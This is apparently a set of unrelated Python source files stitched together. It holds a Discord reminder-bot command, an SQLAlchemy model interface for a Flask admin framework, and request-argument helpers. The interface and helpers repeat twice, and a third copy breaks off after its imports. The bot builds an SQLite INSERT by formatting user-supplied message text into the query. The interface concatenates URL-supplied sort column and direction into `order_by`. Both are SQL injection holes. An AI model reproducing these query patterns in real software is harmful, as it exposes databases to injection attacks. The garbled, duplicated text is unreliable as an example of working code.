        await dclient.send_message(channel, '{}, **USAGE:** {}remindme <time> <message...>'.format(mention, cmd_char))
        print('')                    


# RemindAll command
async def ex_all(dclient, channel, mention, con, con_ex, channel_id, a, log_file, cmd_char):
    a = a.split(' ')
    if len(a) >= 2:
        time = a[0].lower()
        msg = ''
        for i in range(1, len(a)):
            msg += a[i] + ' '
        if 'd' in time or 'h' in time or 'm' in time or 's' in time or ',' in time:
            date = get_date(time)
            try:
                con_ex.execute("INSERT INTO reminder (type, channel, message, date) VALUES ('1', {}, '{}', '{}');"                    
                               .format(channel_id, msg, str(date)))                    
                con.commit()
                await dclient.send_message(channel, '{}, will remind you.'.format(mention))
            except sqlite3.Error as e:
                await dclient.send_message(channel, '{}, error when trying to add info to database! Please notifiy '
                                                    'the admins!'.format(mention))
                print('[{}]: {} - {}'.format(strftime("%b %d, %Y %X", localtime()), 'SQLITE',
                                             'Error when trying to insert data: ' + e.args[0]))
                log_file.write('[{}]: {} - {}\n'.format(strftime("%b %d, %Y %X", localtime()), 'SQLITE',
                                                        'Error when trying to insert data: ' + e.args[0]))
        else:
            await dclient.send_message(channel, '{}, The time must be in #time format (ex: 1h or 2h,5m).'
                                       .format(mention, cmd_char))
    else:
        await dclient.send_message(channel, '{}, **USAGE:** {}remindall <time> <message...>'.format(mention, cmd_char))
        print('')                    

# -*- coding: utf-8 -*-
import sys
import logging
import sqlalchemy as sa

from . import filters
from sqlalchemy.orm import joinedload
from sqlalchemy.exc import IntegrityError
from sqlalchemy import func
from sqlalchemy.orm.properties import SynonymProperty

from ..base import BaseInterface
from ..group import GroupByDateYear, GroupByDateMonth, GroupByCol
from ..mixins import FileColumn, ImageColumn
from ...filemanager import FileManager, ImageManager
from ..._compat import as_unicode
from ...const import LOGMSG_ERR_DBI_ADD_GENERIC, LOGMSG_ERR_DBI_EDIT_GENERIC, LOGMSG_ERR_DBI_DEL_GENERIC, \
    LOGMSG_WAR_DBI_ADD_INTEGRITY, LOGMSG_WAR_DBI_EDIT_INTEGRITY, LOGMSG_WAR_DBI_DEL_INTEGRITY

log = logging.getLogger(__name__)


def _include_filters(obj):
    for key in filters.__all__:
        if not hasattr(obj, key):
            setattr(obj, key, getattr(filters, key))


class SQLAInterface(BaseInterface):
    """
    SQLAModel
    Implements SQLA support methods for views
    """
    session = None

    filter_converter_class = filters.SQLAFilterConverter

    def __init__(self, obj, session=None):
        _include_filters(self)
        self.list_columns = dict()
        self.list_properties = dict()

        self.session = session
        # Collect all SQLA columns and properties
        for prop in sa.orm.class_mapper(obj).iterate_properties:
            if type(prop) != SynonymProperty:
                self.list_properties[prop.key] = prop
        for col_name in obj.__mapper__.columns.keys():
            if col_name in self.list_properties:
                self.list_columns[col_name] = obj.__mapper__.columns[col_name]
        super(SQLAInterface, self).__init__(obj)

    @property
    def model_name(self):
        """
            Returns the models class name
            useful for auto title on views
        """
        return self.obj.__name__

    def _get_base_query(self, query=None, filters=None, order_column='', order_direction=''):
        if filters:
            query = filters.apply_all(query)
        if order_column != '':
            # if Model has custom decorator **renders('<COL_NAME>')**
            # this decorator will add a property to the method named *_col_name*
            if hasattr(self.obj, order_column):
                if hasattr(getattr(self.obj, order_column), '_col_name'):
                    order_column = getattr(getattr(self.obj, order_column), '_col_name')
            query = query.order_by(order_column + ' ' + order_direction)                    
        return query

    def query(self, filters=None, order_column='', order_direction='',
              page=None, page_size=None):
        """
            QUERY
            :param filters:
                dict with filters {<col_name>:<value,...}
            :param order_column:
                name of the column to order
            :param order_direction:
                the direction to order <'asc'|'desc'>
            :param page:
                the current page
            :param page_size:
                the current page size

        """
        query = self.session.query(self.obj)
        if len(order_column.split('.')) >= 2:
            tmp_order_column = ''
            for join_relation in order_column.split('.')[:-1]:
                model_relation = self.get_related_model(join_relation)
                query = query.join(model_relation)
                # redefine order column name, because relationship can have a different name
                # from the related table name.
                tmp_order_column = tmp_order_column + model_relation.__tablename__ + '.'
            order_column = tmp_order_column + order_column.split('.')[-1]
        query_count = self.session.query(func.count('*')).select_from(self.obj)

        query_count = self._get_base_query(query=query_count,
                                           filters=filters)
        query = self._get_base_query(query=query,
                                     filters=filters,
                                     order_column=order_column,
                                     order_direction=order_direction)

        count = query_count.scalar()

        if page:
            query = query.offset(page * page_size)
        if page_size:
            query = query.limit(page_size)

        return count, query.all()

    def query_simple_group(self, group_by='', aggregate_func=None, aggregate_col=None, filters=None):
        query = self.session.query(self.obj)
        query = self._get_base_query(query=query, filters=filters)
        query_result = query.all()
        group = GroupByCol(group_by, 'Group by')
        return group.apply(query_result)

    def query_month_group(self, group_by='', filters=None):
        query = self.session.query(self.obj)
        query = self._get_base_query(query=query, filters=filters)
        query_result = query.all()
        group = GroupByDateMonth(group_by, 'Group by Month')
        return group.apply(query_result)

    def query_year_group(self, group_by='', filters=None):
        query = self.session.query(self.obj)
        query = self._get_base_query(query=query, filters=filters)
        query_result = query.all()
        group_year = GroupByDateYear(group_by, 'Group by Year')
        return group_year.apply(query_result)

    """
    -----------------------------------------
         FUNCTIONS for Testing TYPES
    -----------------------------------------
    """

    def is_image(self, col_name):
        try:
            return isinstance(self.list_columns[col_name].type, ImageColumn)
        except:
            return False

    def is_file(self, col_name):
        try:
            return isinstance(self.list_columns[col_name].type, FileColumn)
        except:
            return False

    def is_string(self, col_name):
        try:
            return isinstance(self.list_columns[col_name].type, sa.types.String)
        except:
            return False

    def is_text(self, col_name):
        try:
            return isinstance(self.list_columns[col_name].type, sa.types.Text)
        except:
            return False

    def is_integer(self, col_name):
        try:
            return isinstance(self.list_columns[col_name].type, sa.types.Integer)
        except:
            return False

    def is_numeric(self, col_name):
        try:
            return isinstance(self.list_columns[col_name].type, sa.types.Numeric)
        except:
            return False

    def is_float(self, col_name):
        try:
            return isinstance(self.list_columns[col_name].type, sa.types.Float)
        except:
            return False

    def is_boolean(self, col_name):
        try:
            return isinstance(self.list_columns[col_name].type, sa.types.Boolean)
        except:
            return False

    def is_date(self, col_name):
        try:
            return isinstance(self.list_columns[col_name].type, sa.types.Date)
        except:
            return False

    def is_datetime(self, col_name):
        try:
            return isinstance(self.list_columns[col_name].type, sa.types.DateTime)
        except:
            return False

    def is_relation(self, col_name):
        try:
            return isinstance(self.list_properties[col_name], sa.orm.properties.RelationshipProperty)
        except:
            return False

    def is_relation_many_to_one(self, col_name):
        try:
            if self.is_relation(col_name):
                return self.list_properties[col_name].direction.name == 'MANYTOONE'
        except:
            return False

    def is_relation_many_to_many(self, col_name):
        try:
            if self.is_relation(col_name):
                return self.list_properties[col_name].direction.name == 'MANYTOMANY'
        except:
            return False

    def is_relation_one_to_one(self, col_name):
        try:
            if self.is_relation(col_name):
                return self.list_properties[col_name].direction.name == 'ONETOONE'
        except:
            return False

    def is_relation_one_to_many(self, col_name):
        try:
            if self.is_relation(col_name):
                return self.list_properties[col_name].direction.name == 'ONETOMANY'
        except:
            return False

    def is_nullable(self, col_name):
        if self.is_relation_many_to_one(col_name):
            col = self.get_relation_fk(col_name)
            return col.nullable
        try:
            return self.list_columns[col_name].nullable
        except:
            return False

    def is_unique(self, col_name):
        try:
            return self.list_columns[col_name].unique
        except:
            return False

    def is_pk(self, col_name):
        try:
            return self.list_columns[col_name].primary_key
        except:
            return False

    def is_fk(self, col_name):
        try:
            return self.list_columns[col_name].foreign_keys
        except:
            return False

    def get_max_length(self, col_name):
        try:
            col = self.list_columns[col_name]
            if col.type.length:
                return col.type.length
            else:
                return -1
        except:
            return -1

    """
    -------------------------------
     FUNCTIONS FOR CRUD OPERATIONS
    -------------------------------
    """

    def add(self, item):
        try:
            self.session.add(item)
            self.session.commit()
            self.message = (as_unicode(self.add_row_message), 'success')
            return True
        except IntegrityError as e:
            self.message = (as_unicode(self.add_integrity_error_message), 'warning')
            log.warning(LOGMSG_WAR_DBI_ADD_INTEGRITY.format(str(e)))
            self.session.rollback()
            return False
        except Exception as e:
            self.message = (as_unicode(self.general_error_message + ' ' + str(sys.exc_info()[0])), 'danger')
            log.exception(LOGMSG_ERR_DBI_ADD_GENERIC.format(str(e)))
            self.session.rollback()
            return False

    def edit(self, item):
        try:
            self.session.merge(item)
            self.session.commit()
            self.message = (as_unicode(self.edit_row_message), 'success')
            return True
        except IntegrityError as e:
            self.message = (as_unicode(self.edit_integrity_error_message), 'warning')
            log.warning(LOGMSG_WAR_DBI_EDIT_INTEGRITY.format(str(e)))
            self.session.rollback()
            return False
        except Exception as e:
            self.message = (as_unicode(self.general_error_message + ' ' + str(sys.exc_info()[0])), 'danger')
            log.exception(LOGMSG_ERR_DBI_EDIT_GENERIC.format(str(e)))
            self.session.rollback()
            return False

    def delete(self, item):
        try:
            self._delete_files(item)
            self.session.delete(item)
            self.session.commit()
            self.message = (as_unicode(self.delete_row_message), 'success')
            return True
        except IntegrityError as e:
            self.message = (as_unicode(self.delete_integrity_error_message), 'warning')
            log.warning(LOGMSG_WAR_DBI_DEL_INTEGRITY.format(str(e)))
            self.session.rollback()
            return False
        except Exception as e:
            self.message = (as_unicode(self.general_error_message + ' ' + str(sys.exc_info()[0])), 'danger')
            log.exception(LOGMSG_ERR_DBI_DEL_GENERIC.format(str(e)))
            self.session.rollback()
            return False

    def delete_all(self, items):
        try:
            for item in items:
                self._delete_files(item)
                self.session.delete(item)
            self.session.commit()
            self.message = (as_unicode(self.delete_row_message), 'success')
            return True
        except IntegrityError as e:
            self.message = (as_unicode(self.delete_integrity_error_message), 'warning')
            log.warning(LOGMSG_WAR_DBI_DEL_INTEGRITY.format(str(e)))
            self.session.rollback()
            return False
        except Exception as e:
            self.message = (as_unicode(self.general_error_message + ' ' + str(sys.exc_info()[0])), 'danger')
            log.exception(LOGMSG_ERR_DBI_DEL_GENERIC.format(str(e)))
            self.session.rollback()
            return False

    """
    -----------------------
     FILE HANDLING METHODS
    -----------------------
    """

    def _add_files(self, this_request, item):
        fm = FileManager()
        im = ImageManager()
        for file_col in this_request.files:
            if self.is_file(file_col):
                fm.save_file(this_request.files[file_col], getattr(item, file_col))
        for file_col in this_request.files:
            if self.is_image(file_col):
                im.save_file(this_request.files[file_col], getattr(item, file_col))

    def _delete_files(self, item):
        for file_col in self.get_file_column_list():
            if self.is_file(file_col):
                if getattr(item, file_col):
                    fm = FileManager()
                    fm.delete_file(getattr(item, file_col))
        for file_col in self.get_image_column_list():
            if self.is_image(file_col):
                if getattr(item, file_col):
                    im = ImageManager()
                    im.delete_file(getattr(item, file_col))

    """
    ------------------------------
     FUNCTIONS FOR RELATED MODELS
    ------------------------------
    """

    def get_col_default(self, col_name):
        default = getattr(self.list_columns[col_name], 'default', None)
        if default is not None:
            value = getattr(default, 'arg', None)
            if value is not None:
                if getattr(default, 'is_callable', False):
                    return lambda: default.arg(None)
                else:
                    if not getattr(default, 'is_scalar', True):
                        return None
                return value

    def get_related_model(self, col_name):
        return self.list_properties[col_name].mapper.class_

    def query_model_relation(self, col_name):
        model = self.get_related_model(col_name)
        return self.session.query(model).all()

    def get_related_interface(self, col_name):
        return self.__class__(self.get_related_model(col_name), self.session)

    def get_related_obj(self, col_name, value):
        rel_model = self.get_related_model(col_name)
        return self.session.query(rel_model).get(value)

    def get_related_fks(self, related_views):
        return [view.datamodel.get_related_fk(self.obj) for view in related_views]

    def get_related_fk(self, model):
        for col_name in self.list_properties.keys():
            if self.is_relation(col_name):
                if model == self.get_related_model(col_name):
                    return col_name

    """
    ------------- 
     GET METHODS
    -------------
    """

    def get_columns_list(self):
        """
            Returns all model's columns on SQLA properties
        """
        return list(self.list_properties.keys())

    def get_user_columns_list(self):
        """
            Returns all model's columns except pk or fk
        """
        ret_lst = list()
        for col_name in self.get_columns_list():
            if (not self.is_pk(col_name)) and (not self.is_fk(col_name)):
                ret_lst.append(col_name)
        return ret_lst

    # TODO get different solution, more integrated with filters
    def get_search_columns_list(self):
        ret_lst = list()
        for col_name in self.get_columns_list():
            if not self.is_relation(col_name):
                tmp_prop = self.get_property_first_col(col_name).name
                if (not self.is_pk(tmp_prop)) and \
                        (not self.is_fk(tmp_prop)) and \
                        (not self.is_image(col_name)) and \
                        (not self.is_file(col_name)) and \
                        (not self.is_boolean(col_name)):
                    ret_lst.append(col_name)
            else:
                ret_lst.append(col_name)
        return ret_lst

    def get_order_columns_list(self, list_columns=None):
        """
            Returns the columns that can be ordered

            :param list_columns: optional list of columns name, if provided will
                use this list only.
        """
        ret_lst = list()
        list_columns = list_columns or self.get_columns_list()
        for col_name in list_columns:
            if not self.is_relation(col_name):
                if hasattr(self.obj, col_name):
                    if (not hasattr(getattr(self.obj, col_name), '__call__') or
                            hasattr(getattr(self.obj, col_name), '_col_name')):
                        ret_lst.append(col_name)
                else:
                    ret_lst.append(col_name)
        return ret_lst

    def get_file_column_list(self):
        return [i.name for i in self.obj.__mapper__.columns if isinstance(i.type, FileColumn)]

    def get_image_column_list(self):
        return [i.name for i in self.obj.__mapper__.columns if isinstance(i.type, ImageColumn)]

    def get_property_first_col(self, col_name):
        # support for only one col for pk and fk
        return self.list_properties[col_name].columns[0]

    def get_relation_fk(self, col_name):
        # support for only one col for pk and fk
        return list(self.list_properties[col_name].local_columns)[0]

    def get(self, id, filters=None):
        if filters:
            query = query = self.session.query(self.obj)
            _filters = filters.copy()
            _filters.add_filter(self.get_pk_name(), self.FilterEqual, id)
            query = self._get_base_query(query=query, filters=_filters)
            return query.first()
        return self.session.query(self.obj).get(id)

    def get_pk_name(self):
        for col_name in self.list_columns.keys():
            if self.is_pk(col_name):
                return col_name


"""
    For Retro-Compatibility
"""
SQLModel = SQLAInterface

import re
from flask import request


class Stack(object):
    """
        Stack data structure will not insert
        equal sequential data
    """
    def __init__(self, list=None, size=5):
        self.size = size
        self.data = list or []

    def push(self, item):
        if self.data:
            if item != self.data[len(self.data) - 1]:
                self.data.append(item)
        else:
            self.data.append(item)
        if len(self.data) > self.size:
            self.data.pop(0)

    def pop(self):
        if len(self.data) == 0:
            return None
        return self.data.pop(len(self.data) - 1)

    def to_json(self):
        return self.data

def get_group_by_args():
    """
        Get page arguments for group by
    """
    group_by = request.args.get('group_by')
    if not group_by: group_by = ''
    return group_by

def get_page_args():
    """
        Get page arguments, returns a dictionary
        { <VIEW_NAME>: PAGE_NUMBER }

        Arguments are passed: page_<VIEW_NAME>=<PAGE_NUMBER>

    """
    pages = {}
    for arg in request.args:
        re_match = re.findall('page_(.*)', arg)
        if re_match:
            pages[re_match[0]] = int(request.args.get(arg))
    return pages

def get_page_size_args():
    """
        Get page size arguments, returns an int
        { <VIEW_NAME>: PAGE_NUMBER }

        Arguments are passed: psize_<VIEW_NAME>=<PAGE_SIZE>

    """
    page_sizes = {}
    for arg in request.args:
        re_match = re.findall('psize_(.*)', arg)
        if re_match:
            page_sizes[re_match[0]] = int(request.args.get(arg))
    return page_sizes

def get_order_args():
    """
        Get order arguments, return a dictionary
        { <VIEW_NAME>: (ORDER_COL, ORDER_DIRECTION) }

        Arguments are passed like: _oc_<VIEW_NAME>=<COL_NAME>&_od_<VIEW_NAME>='asc'|'desc'

    """
    orders = {}
    for arg in request.args:
        re_match = re.findall('_oc_(.*)', arg)
        if re_match:
            orders[re_match[0]] = (request.args.get(arg), request.args.get('_od_' + re_match[0]))                    
    return orders

def get_filter_args(filters):
    filters.clear_filters()
    for arg in request.args:
        re_match = re.findall('_flt_(\d)_(.*)', arg)
        if re_match:
            filters.add_filter_index(re_match[0][1], int(re_match[0][0]), request.args.get(arg))

# -*- coding: utf-8 -*-
import sys
import logging
import sqlalchemy as sa

from . import filters
from sqlalchemy.orm import joinedload
from sqlalchemy.exc import IntegrityError
from sqlalchemy import func
from sqlalchemy.orm.properties import SynonymProperty

from ..base import BaseInterface
from ..group import GroupByDateYear, GroupByDateMonth, GroupByCol
from ..mixins import FileColumn, ImageColumn
from ...filemanager import FileManager, ImageManager
from ..._compat import as_unicode
from ...const import LOGMSG_ERR_DBI_ADD_GENERIC, LOGMSG_ERR_DBI_EDIT_GENERIC, LOGMSG_ERR_DBI_DEL_GENERIC, \
    LOGMSG_WAR_DBI_ADD_INTEGRITY, LOGMSG_WAR_DBI_EDIT_INTEGRITY, LOGMSG_WAR_DBI_DEL_INTEGRITY

log = logging.getLogger(__name__)


def _include_filters(obj):
    for key in filters.__all__:
        if not hasattr(obj, key):
            setattr(obj, key, getattr(filters, key))


class SQLAInterface(BaseInterface):
    """
    SQLAModel
    Implements SQLA support methods for views
    """
    session = None

    filter_converter_class = filters.SQLAFilterConverter

    def __init__(self, obj, session=None):
        _include_filters(self)
        self.list_columns = dict()
        self.list_properties = dict()

        self.session = session
        # Collect all SQLA columns and properties
        for prop in sa.orm.class_mapper(obj).iterate_properties:
            if type(prop) != SynonymProperty:
                self.list_properties[prop.key] = prop
        for col_name in obj.__mapper__.columns.keys():
            if col_name in self.list_properties:
                self.list_columns[col_name] = obj.__mapper__.columns[col_name]
        super(SQLAInterface, self).__init__(obj)

    @property
    def model_name(self):
        """
            Returns the models class name
            useful for auto title on views
        """
        return self.obj.__name__

    def _get_base_query(self, query=None, filters=None, order_column='', order_direction=''):
        if filters:
            query = filters.apply_all(query)
        if order_column != '':
            # if Model has custom decorator **renders('<COL_NAME>')**
            # this decorator will add a property to the method named *_col_name*
            if hasattr(self.obj, order_column):
                if hasattr(getattr(self.obj, order_column), '_col_name'):
                    order_column = getattr(getattr(self.obj, order_column), '_col_name')
            query = query.order_by(order_column + ' ' + order_direction)                    
        return query

    def query(self, filters=None, order_column='', order_direction='',
              page=None, page_size=None):
        """
            QUERY
            :param filters:
                dict with filters {<col_name>:<value,...}
            :param order_column:
                name of the column to order
            :param order_direction:
                the direction to order <'asc'|'desc'>
            :param page:
                the current page
            :param page_size:
                the current page size

        """
        query = self.session.query(self.obj)
        if len(order_column.split('.')) >= 2:
            tmp_order_column = ''
            for join_relation in order_column.split('.')[:-1]:
                model_relation = self.get_related_model(join_relation)
                query = query.join(model_relation)
                # redefine order column name, because relationship can have a different name
                # from the related table name.
                tmp_order_column = tmp_order_column + model_relation.__tablename__ + '.'
            order_column = tmp_order_column + order_column.split('.')[-1]
        query_count = self.session.query(func.count('*')).select_from(self.obj)

        query_count = self._get_base_query(query=query_count,
                                           filters=filters)
        query = self._get_base_query(query=query,
                                     filters=filters,
                                     order_column=order_column,
                                     order_direction=order_direction)

        count = query_count.scalar()

        if page:
            query = query.offset(page * page_size)
        if page_size:
            query = query.limit(page_size)

        return count, query.all()

    def query_simple_group(self, group_by='', aggregate_func=None, aggregate_col=None, filters=None):
        query = self.session.query(self.obj)
        query = self._get_base_query(query=query, filters=filters)
        query_result = query.all()
        group = GroupByCol(group_by, 'Group by')
        return group.apply(query_result)

    def query_month_group(self, group_by='', filters=None):
        query = self.session.query(self.obj)
        query = self._get_base_query(query=query, filters=filters)
        query_result = query.all()
        group = GroupByDateMonth(group_by, 'Group by Month')
        return group.apply(query_result)

    def query_year_group(self, group_by='', filters=None):
        query = self.session.query(self.obj)
        query = self._get_base_query(query=query, filters=filters)
        query_result = query.all()
        group_year = GroupByDateYear(group_by, 'Group by Year')
        return group_year.apply(query_result)

    """
    -----------------------------------------
         FUNCTIONS for Testing TYPES
    -----------------------------------------
    """

    def is_image(self, col_name):
        try:
            return isinstance(self.list_columns[col_name].type, ImageColumn)
        except:
            return False

    def is_file(self, col_name):
        try:
            return isinstance(self.list_columns[col_name].type, FileColumn)
        except:
            return False

    def is_string(self, col_name):
        try:
            return isinstance(self.list_columns[col_name].type, sa.types.String)
        except:
            return False

    def is_text(self, col_name):
        try:
            return isinstance(self.list_columns[col_name].type, sa.types.Text)
        except:
            return False

    def is_integer(self, col_name):
        try:
            return isinstance(self.list_columns[col_name].type, sa.types.Integer)
        except:
            return False

    def is_numeric(self, col_name):
        try:
            return isinstance(self.list_columns[col_name].type, sa.types.Numeric)
        except:
            return False

    def is_float(self, col_name):
        try:
            return isinstance(self.list_columns[col_name].type, sa.types.Float)
        except:
            return False

    def is_boolean(self, col_name):
        try:
            return isinstance(self.list_columns[col_name].type, sa.types.Boolean)
        except:
            return False

    def is_date(self, col_name):
        try:
            return isinstance(self.list_columns[col_name].type, sa.types.Date)
        except:
            return False

    def is_datetime(self, col_name):
        try:
            return isinstance(self.list_columns[col_name].type, sa.types.DateTime)
        except:
            return False

    def is_relation(self, col_name):
        try:
            return isinstance(self.list_properties[col_name], sa.orm.properties.RelationshipProperty)
        except:
            return False

    def is_relation_many_to_one(self, col_name):
        try:
            if self.is_relation(col_name):
                return self.list_properties[col_name].direction.name == 'MANYTOONE'
        except:
            return False

    def is_relation_many_to_many(self, col_name):
        try:
            if self.is_relation(col_name):
                return self.list_properties[col_name].direction.name == 'MANYTOMANY'
        except:
            return False

    def is_relation_one_to_one(self, col_name):
        try:
            if self.is_relation(col_name):
                return self.list_properties[col_name].direction.name == 'ONETOONE'
        except:
            return False

    def is_relation_one_to_many(self, col_name):
        try:
            if self.is_relation(col_name):
                return self.list_properties[col_name].direction.name == 'ONETOMANY'
        except:
            return False

    def is_nullable(self, col_name):
        if self.is_relation_many_to_one(col_name):
            col = self.get_relation_fk(col_name)
            return col.nullable
        try:
            return self.list_columns[col_name].nullable
        except:
            return False

    def is_unique(self, col_name):
        try:
            return self.list_columns[col_name].unique
        except:
            return False

    def is_pk(self, col_name):
        try:
            return self.list_columns[col_name].primary_key
        except:
            return False

    def is_fk(self, col_name):
        try:
            return self.list_columns[col_name].foreign_keys
        except:
            return False

    def get_max_length(self, col_name):
        try:
            col = self.list_columns[col_name]
            if col.type.length:
                return col.type.length
            else:
                return -1
        except:
            return -1

    """
    -------------------------------
     FUNCTIONS FOR CRUD OPERATIONS
    -------------------------------
    """

    def add(self, item):
        try:
            self.session.add(item)
            self.session.commit()
            self.message = (as_unicode(self.add_row_message), 'success')
            return True
        except IntegrityError as e:
            self.message = (as_unicode(self.add_integrity_error_message), 'warning')
            log.warning(LOGMSG_WAR_DBI_ADD_INTEGRITY.format(str(e)))
            self.session.rollback()
            return False
        except Exception as e:
            self.message = (as_unicode(self.general_error_message + ' ' + str(sys.exc_info()[0])), 'danger')
            log.exception(LOGMSG_ERR_DBI_ADD_GENERIC.format(str(e)))
            self.session.rollback()
            return False

    def edit(self, item):
        try:
            self.session.merge(item)
            self.session.commit()
            self.message = (as_unicode(self.edit_row_message), 'success')
            return True
        except IntegrityError as e:
            self.message = (as_unicode(self.edit_integrity_error_message), 'warning')
            log.warning(LOGMSG_WAR_DBI_EDIT_INTEGRITY.format(str(e)))
            self.session.rollback()
            return False
        except Exception as e:
            self.message = (as_unicode(self.general_error_message + ' ' + str(sys.exc_info()[0])), 'danger')
            log.exception(LOGMSG_ERR_DBI_EDIT_GENERIC.format(str(e)))
            self.session.rollback()
            return False

    def delete(self, item):
        try:
            self._delete_files(item)
            self.session.delete(item)
            self.session.commit()
            self.message = (as_unicode(self.delete_row_message), 'success')
            return True
        except IntegrityError as e:
            self.message = (as_unicode(self.delete_integrity_error_message), 'warning')
            log.warning(LOGMSG_WAR_DBI_DEL_INTEGRITY.format(str(e)))
            self.session.rollback()
            return False
        except Exception as e:
            self.message = (as_unicode(self.general_error_message + ' ' + str(sys.exc_info()[0])), 'danger')
            log.exception(LOGMSG_ERR_DBI_DEL_GENERIC.format(str(e)))
            self.session.rollback()
            return False

    def delete_all(self, items):
        try:
            for item in items:
                self._delete_files(item)
                self.session.delete(item)
            self.session.commit()
            self.message = (as_unicode(self.delete_row_message), 'success')
            return True
        except IntegrityError as e:
            self.message = (as_unicode(self.delete_integrity_error_message), 'warning')
            log.warning(LOGMSG_WAR_DBI_DEL_INTEGRITY.format(str(e)))
            self.session.rollback()
            return False
        except Exception as e:
            self.message = (as_unicode(self.general_error_message + ' ' + str(sys.exc_info()[0])), 'danger')
            log.exception(LOGMSG_ERR_DBI_DEL_GENERIC.format(str(e)))
            self.session.rollback()
            return False

    """
    -----------------------
     FILE HANDLING METHODS
    -----------------------
    """

    def _add_files(self, this_request, item):
        fm = FileManager()
        im = ImageManager()
        for file_col in this_request.files:
            if self.is_file(file_col):
                fm.save_file(this_request.files[file_col], getattr(item, file_col))
        for file_col in this_request.files:
            if self.is_image(file_col):
                im.save_file(this_request.files[file_col], getattr(item, file_col))

    def _delete_files(self, item):
        for file_col in self.get_file_column_list():
            if self.is_file(file_col):
                if getattr(item, file_col):
                    fm = FileManager()
                    fm.delete_file(getattr(item, file_col))
        for file_col in self.get_image_column_list():
            if self.is_image(file_col):
                if getattr(item, file_col):
                    im = ImageManager()
                    im.delete_file(getattr(item, file_col))

    """
    ------------------------------
     FUNCTIONS FOR RELATED MODELS
    ------------------------------
    """

    def get_col_default(self, col_name):
        default = getattr(self.list_columns[col_name], 'default', None)
        if default is not None:
            value = getattr(default, 'arg', None)
            if value is not None:
                if getattr(default, 'is_callable', False):
                    return lambda: default.arg(None)
                else:
                    if not getattr(default, 'is_scalar', True):
                        return None
                return value

    def get_related_model(self, col_name):
        return self.list_properties[col_name].mapper.class_

    def query_model_relation(self, col_name):
        model = self.get_related_model(col_name)
        return self.session.query(model).all()

    def get_related_interface(self, col_name):
        return self.__class__(self.get_related_model(col_name), self.session)

    def get_related_obj(self, col_name, value):
        rel_model = self.get_related_model(col_name)
        return self.session.query(rel_model).get(value)

    def get_related_fks(self, related_views):
        return [view.datamodel.get_related_fk(self.obj) for view in related_views]

    def get_related_fk(self, model):
        for col_name in self.list_properties.keys():
            if self.is_relation(col_name):
                if model == self.get_related_model(col_name):
                    return col_name

    """
    ------------- 
     GET METHODS
    -------------
    """

    def get_columns_list(self):
        """
            Returns all model's columns on SQLA properties
        """
        return list(self.list_properties.keys())

    def get_user_columns_list(self):
        """
            Returns all model's columns except pk or fk
        """
        ret_lst = list()
        for col_name in self.get_columns_list():
            if (not self.is_pk(col_name)) and (not self.is_fk(col_name)):
                ret_lst.append(col_name)
        return ret_lst

    # TODO get different solution, more integrated with filters
    def get_search_columns_list(self):
        ret_lst = list()
        for col_name in self.get_columns_list():
            if not self.is_relation(col_name):
                tmp_prop = self.get_property_first_col(col_name).name
                if (not self.is_pk(tmp_prop)) and \
                        (not self.is_fk(tmp_prop)) and \
                        (not self.is_image(col_name)) and \
                        (not self.is_file(col_name)) and \
                        (not self.is_boolean(col_name)):
                    ret_lst.append(col_name)
            else:
                ret_lst.append(col_name)
        return ret_lst

    def get_order_columns_list(self, list_columns=None):
        """
            Returns the columns that can be ordered

            :param list_columns: optional list of columns name, if provided will
                use this list only.
        """
        ret_lst = list()
        list_columns = list_columns or self.get_columns_list()
        for col_name in list_columns:
            if not self.is_relation(col_name):
                if hasattr(self.obj, col_name):
                    if (not hasattr(getattr(self.obj, col_name), '__call__') or
                            hasattr(getattr(self.obj, col_name), '_col_name')):
                        ret_lst.append(col_name)
                else:
                    ret_lst.append(col_name)
        return ret_lst

    def get_file_column_list(self):
        return [i.name for i in self.obj.__mapper__.columns if isinstance(i.type, FileColumn)]

    def get_image_column_list(self):
        return [i.name for i in self.obj.__mapper__.columns if isinstance(i.type, ImageColumn)]

    def get_property_first_col(self, col_name):
        # support for only one col for pk and fk
        return self.list_properties[col_name].columns[0]

    def get_relation_fk(self, col_name):
        # support for only one col for pk and fk
        return list(self.list_properties[col_name].local_columns)[0]

    def get(self, id, filters=None):
        if filters:
            query = query = self.session.query(self.obj)
            _filters = filters.copy()
            _filters.add_filter(self.get_pk_name(), self.FilterEqual, id)
            query = self._get_base_query(query=query, filters=_filters)
            return query.first()
        return self.session.query(self.obj).get(id)

    def get_pk_name(self):
        for col_name in self.list_columns.keys():
            if self.is_pk(col_name):
                return col_name


"""
    For Retro-Compatibility
"""
SQLModel = SQLAInterface

import re
from flask import request


class Stack(object):
    """
        Stack data structure will not insert
        equal sequential data
    """
    def __init__(self, list=None, size=5):
        self.size = size
        self.data = list or []

    def push(self, item):
        if self.data:
            if item != self.data[len(self.data) - 1]:
                self.data.append(item)
        else:
            self.data.append(item)
        if len(self.data) > self.size:
            self.data.pop(0)

    def pop(self):
        if len(self.data) == 0:
            return None
        return self.data.pop(len(self.data) - 1)

    def to_json(self):
        return self.data

def get_group_by_args():
    """
        Get page arguments for group by
    """
    group_by = request.args.get('group_by')
    if not group_by: group_by = ''
    return group_by

def get_page_args():
    """
        Get page arguments, returns a dictionary
        { <VIEW_NAME>: PAGE_NUMBER }

        Arguments are passed: page_<VIEW_NAME>=<PAGE_NUMBER>

    """
    pages = {}
    for arg in request.args:
        re_match = re.findall('page_(.*)', arg)
        if re_match:
            pages[re_match[0]] = int(request.args.get(arg))
    return pages

def get_page_size_args():
    """
        Get page size arguments, returns an int
        { <VIEW_NAME>: PAGE_NUMBER }

        Arguments are passed: psize_<VIEW_NAME>=<PAGE_SIZE>

    """
    page_sizes = {}
    for arg in request.args:
        re_match = re.findall('psize_(.*)', arg)
        if re_match:
            page_sizes[re_match[0]] = int(request.args.get(arg))
    return page_sizes

def get_order_args():
    """
        Get order arguments, return a dictionary
        { <VIEW_NAME>: (ORDER_COL, ORDER_DIRECTION) }

        Arguments are passed like: _oc_<VIEW_NAME>=<COL_NAME>&_od_<VIEW_NAME>='asc'|'desc'

    """
    orders = {}
    for arg in request.args:
        re_match = re.findall('_oc_(.*)', arg)
        if re_match:
            orders[re_match[0]] = (request.args.get(arg), request.args.get('_od_' + re_match[0]))                    
    return orders

def get_filter_args(filters):
    filters.clear_filters()
    for arg in request.args:
        re_match = re.findall('_flt_(\d)_(.*)', arg)
        if re_match:
            filters.add_filter_index(re_match[0][1], int(re_match[0][0]), request.args.get(arg))

# -*- coding: utf-8 -*-
import sys
import logging
import sqlalchemy as sa

from . import filters
from sqlalchemy.orm import joinedload
from sqlalchemy.exc import IntegrityError
from sqlalchemy import func
from sqlalchemy.orm.properties import SynonymProperty

from ..base import BaseInterface
